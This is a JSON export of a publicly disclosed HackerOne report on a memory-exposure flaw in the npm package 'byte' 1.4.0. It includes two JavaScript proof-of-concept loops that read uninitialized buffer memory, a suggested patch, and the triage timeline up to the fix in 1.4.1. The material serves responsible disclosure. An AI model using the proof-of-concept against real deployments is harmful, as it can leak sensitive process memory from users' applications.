{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "bl4de", 
        "kapytein", 
        "0x08", 
        "nims786"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 330351, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-05-11T20:25:16.335Z", 
    "vulnerability_information": "I would like to report a memory exposure vulnerbaility in `byte`\nIt allows to extract process memory using Buffers in some cases.\n\n# Module\n\n**module name:** `byte`\n**version:** 1.4.0\n**npm page:** `https://www.npmjs.com/package/byte`\n\n## Module Description\n\n> Input Buffer and Output Buffer, just like Java ByteBuffer.\n\n## Module Stats\n\n705 downloads in the last day\n3 836 downloads in the last week\n14 813 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\n`byte` allocates uninitialized buffers on all Node.js versions, even on the ones that zero-full `new Buffer()` by default, as it uses `.allocUnsafe()`. It provides an API for writing data and an API for reading data from the buffer, but the internal buffer is not zero-filled and the API for reading does not validate that the memory being read was ever initialized.\n\nI also don't think this corresponds to behavior  of the Java ByteBuffer \u2014 that one is zero-filled afaik.\n\n## Steps To Reproduce:\n\n```js\nvar ByteBuffer = require('byte');\nfor (let k = 0; k < 1e4; k++) {\n  var bb = new ByteBuffer();\n  for (let i = 0; i < 180; i++) {\n    bb.putString('ok');\n  }\n  const s = bb.getString(1000);\n  if (s.includes(' {')) {\n    console.log(s);\n    console.log('Finished at attempt: ' + k);\n    break;\n  }\n}\n```\n\n```js\nvar ByteBuffer = require('byte');\nfor (let k = 0; k < 1e4; k++) {\n  var bb = ByteBuffer.allocate(50);\n  const twos = Buffer.alloc(10, 2);\n  for (let i = 0; i < 7; i++) bb.put(twos, 10);\n  const s = bb.get(0, 100);\n  if (s.includes(' {')) {\n    console.log(s.toString('utf-8'));\n    console.log('Finished at attempt: ' + k);\n    break;\n  }\n}\n```\n\n## Patch\n\nReplace all `Buffer(num)` and `Buffer.allocUnsafe(num)` usage with `Buffer.alloc(num)` and use a polyfill, e.g. [safer-buffer](https://www.npmjs.com/package/safer-buffer) or [buffer-alloc](https://www.npmjs.com/package/buffer-alloc).\n\n## Supporting Material/References:\n\n- OS: Arch Linux current\n- Node.js 9.9.0\n- npm 5.8.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nRead process memory containing sensitive information.", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "low", 
            "privileges_required": "none", 
            "user_interaction": "none", 
            "attack_vector": "physical", 
            "attack_complexity": "low", 
            "scope": "unchanged", 
            "integrity": "none", 
            "availability": "high"
        }, 
        "rating": "medium", 
        "score": 5.2, 
        "author_type": "Team"
    }, 
    "title": "`byte` allocates uninitialized buffers and reads data from them past the initialized length", 
    "is_member_of_team?": null, 
    "vote_count": 4, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": {
        "asset_identifier": "byte", 
        "max_severity": "critical", 
        "databaseId": 9719, 
        "asset_type": "SOURCE_CODE"
    }, 
    "allow_singular_disclosure_at": "2018-06-10T20:25:16.409Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-04-08T07:29:29.946Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-08T07:29:29.946Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Medium (5.2)", 
                "old_severity": "Medium"
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 2577525, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-08T07:29:58.346Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-08T07:29:58.346Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Hi\u00a0@chalker,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n", 
            "markdown_message": "<p>Hi\u00a0@chalker,</p>\n\n<p>Thanks for reporting this issue.</p>\n\n<p>I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.<br>\nI will invite the package maintainer to this issue.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2577526, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-08T07:30:03.679Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-08T07:30:03.679Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 2577528, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-24T19:41:15.133Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-24T19:41:15.133Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Trying to reach out to further project maintainers", 
            "markdown_message": "<p>Trying to reach out to further project maintainers</p>\n", 
            "type": "Activities::Comment", 
            "id": 2661114, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-11T15:37:23.430Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-11T15:37:23.430Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "@chalker let's disclose?\nno input from maintainers", 
            "markdown_message": "<p><a href=\"/chalker\">@chalker</a> let&#39;s disclose?<br>\nno input from maintainers</p>\n", 
            "type": "Activities::Comment", 
            "id": 2729686, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-11T17:50:41.995Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-11T17:50:41.995Z", 
            "actor": {
                "username": "chalker", 
                "url": "/chalker", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/068/907/8d96ee4e93e21e566a3d51e2746ad4df2e53256a_medium.png?1490131885"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Strange\u2026 Last publish was 3 months ago, it seems active.\nI'm fine with the disclosure though \u2014 this isn't an epic issue ;-).", 
            "markdown_message": "<p>Strange\u2026 Last publish was 3 months ago, it seems active.<br>\nI&#39;m fine with the disclosure though \u2014 this isn&#39;t an epic issue ;-).</p>\n", 
            "type": "Activities::Comment", 
            "id": 2730182, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-11T20:24:47.212Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-11T20:24:47.212Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Yeah I noticed it.\nLet's continue with disclosure and can circle back to update where necessary.", 
            "markdown_message": "<p>Yeah I noticed it.<br>\nLet&#39;s continue with disclosure and can circle back to update where necessary.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2731243, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "chalker", 
                "url": "/chalker"
            }, 
            "created_at": "2018-05-11T20:24:55.060Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-11T20:24:55.060Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 2731244, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-11T20:25:16.366Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-11T20:25:16.366Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2731245, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-11T20:25:26.358Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-11T20:25:26.358Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ManuallyDisclosed", 
            "id": 2731246, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-15T15:13:30.200Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-15T15:13:30.200Z", 
            "actor": {
                "username": "chalker", 
                "url": "/chalker", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/068/907/8d96ee4e93e21e566a3d51e2746ad4df2e53256a_medium.png?1490131885"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Fixed in `byte@1.4.1`.", 
            "markdown_message": "<p>Fixed in <code>byte@1.4.1</code>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2746887, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "old_scope": "Other module", 
            "created_at": "2018-05-19T07:19:41.466Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-19T07:19:41.466Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "new_scope": "byte", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ChangedScope", 
            "id": 2764945, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "chalker", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/chalker", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/068/907/f597f5ffcdc20460ef54feffb26e20d03f4d2421_small.png?1490131885"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 8, 
        "name": "Out-of-bounds Read"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -15472729.170273408, 
    "disclosed_at": "2018-05-11T20:25:26.435Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/330351", 
    "created_at": "2018-03-27T13:37:06.258Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>I would like to report a memory exposure vulnerbaility in <code>byte</code><br>\nIt allows to extract process memory using Buffers in some cases.</p>\n\n<h1 id=\"module\">Module</h1>\n\n<p><strong>module name:</strong> <code>byte</code><br>\n<strong>version:</strong> 1.4.0<br>\n<strong>npm page:</strong> <code>https://www.npmjs.com/package/byte</code></p>\n\n<h2 id=\"module-description\">Module Description</h2>\n\n<blockquote>\n<p>Input Buffer and Output Buffer, just like Java ByteBuffer.</p>\n</blockquote>\n\n<h2 id=\"module-stats\">Module Stats</h2>\n\n<p>705 downloads in the last day<br>\n3 836 downloads in the last week<br>\n14 813 downloads in the last month</p>\n\n<h1 id=\"vulnerability\">Vulnerability</h1>\n\n<h2 id=\"vulnerability-description\">Vulnerability Description</h2>\n\n<p><code>byte</code> allocates uninitialized buffers on all Node.js versions, even on the ones that zero-full <code>new Buffer()</code> by default, as it uses <code>.allocUnsafe()</code>. It provides an API for writing data and an API for reading data from the buffer, but the internal buffer is not zero-filled and the API for reading does not validate that the memory being read was ever initialized.</p>\n\n<p>I also don&#39;t think this corresponds to behavior  of the Java ByteBuffer \u2014 that one is zero-filled afaik.</p>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">var</span> <span class=\"nx\">ByteBuffer</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">&#39;byte&#39;</span><span class=\"p\">);</span>\n<span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">let</span> <span class=\"nx\">k</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">k</span> <span class=\"o\">&lt;</span> <span class=\"mi\">1</span><span class=\"nx\">e4</span><span class=\"p\">;</span> <span class=\"nx\">k</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">bb</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">ByteBuffer</span><span class=\"p\">();</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">let</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"mi\">180</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">bb</span><span class=\"p\">.</span><span class=\"nx\">putString</span><span class=\"p\">(</span><span class=\"s1\">&#39;ok&#39;</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n  <span class=\"kr\">const</span> <span class=\"nx\">s</span> <span class=\"o\">=</span> <span class=\"nx\">bb</span><span class=\"p\">.</span><span class=\"nx\">getString</span><span class=\"p\">(</span><span class=\"mi\">1000</span><span class=\"p\">);</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">includes</span><span class=\"p\">(</span><span class=\"s1\">&#39; {&#39;</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">s</span><span class=\"p\">);</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">&#39;Finished at attempt: &#39;</span> <span class=\"o\">+</span> <span class=\"nx\">k</span><span class=\"p\">);</span>\n    <span class=\"k\">break</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre><pre class=\"highlight javascript\"><code><span class=\"kd\">var</span> <span class=\"nx\">ByteBuffer</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">&#39;byte&#39;</span><span class=\"p\">);</span>\n<span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">let</span> <span class=\"nx\">k</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">k</span> <span class=\"o\">&lt;</span> <span class=\"mi\">1</span><span class=\"nx\">e4</span><span class=\"p\">;</span> <span class=\"nx\">k</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">bb</span> <span class=\"o\">=</span> <span class=\"nx\">ByteBuffer</span><span class=\"p\">.</span><span class=\"nx\">allocate</span><span class=\"p\">(</span><span class=\"mi\">50</span><span class=\"p\">);</span>\n  <span class=\"kr\">const</span> <span class=\"nx\">twos</span> <span class=\"o\">=</span> <span class=\"nx\">Buffer</span><span class=\"p\">.</span><span class=\"nx\">alloc</span><span class=\"p\">(</span><span class=\"mi\">10</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">);</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">let</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"mi\">7</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"nx\">bb</span><span class=\"p\">.</span><span class=\"nx\">put</span><span class=\"p\">(</span><span class=\"nx\">twos</span><span class=\"p\">,</span> <span class=\"mi\">10</span><span class=\"p\">);</span>\n  <span class=\"kr\">const</span> <span class=\"nx\">s</span> <span class=\"o\">=</span> <span class=\"nx\">bb</span><span class=\"p\">.</span><span class=\"nx\">get</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">100</span><span class=\"p\">);</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">includes</span><span class=\"p\">(</span><span class=\"s1\">&#39; {&#39;</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">(</span><span class=\"s1\">&#39;utf-8&#39;</span><span class=\"p\">));</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">&#39;Finished at attempt: &#39;</span> <span class=\"o\">+</span> <span class=\"nx\">k</span><span class=\"p\">);</span>\n    <span class=\"k\">break</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre>\n<h2 id=\"patch\">Patch</h2>\n\n<p>Replace all <code>Buffer(num)</code> and <code>Buffer.allocUnsafe(num)</code> usage with <code>Buffer.alloc(num)</code> and use a polyfill, e.g. <a href=\"/redirect?signature=cb30ab42bdd69ccae7907c23f16a5f43d513769b&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fsafer-buffer\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>safer-buffer</span><i class=\"icon-external-link\"></i></a> or <a href=\"/redirect?signature=b5ca5938eb4c47035d5897918c280527647b0da7&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fbuffer-alloc\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>buffer-alloc</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<ul>\n<li>OS: Arch Linux current</li>\n<li>Node.js 9.9.0</li>\n<li>npm 5.8.0</li>\n</ul>\n\n<h1 id=\"wrap-up\">Wrap up</h1>\n\n<ul>\n<li>I contacted the maintainer to let them know: N</li>\n<li>I opened an issue in the related repository: N</li>\n</ul>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>Read process memory containing sensitive information.</p>\n", 
    "severity_rating": "medium", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://nodejs.org/en/security/", 
            "about": "This program is used to handle vulnerabilities in the Node.js ecosystem.", 
            "twitter_handle": "", 
            "name": "Node.js third-party modules"
        }, 
        "handle": "nodejs-ecosystem", 
        "url": "https://hackerone.com/nodejs-ecosystem", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/023/949/309112251b444244d95977d1299148aae6482789_small.?1508679627", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 23949, 
        "default_currency": "usd"
    }, 
    "is_published": false
}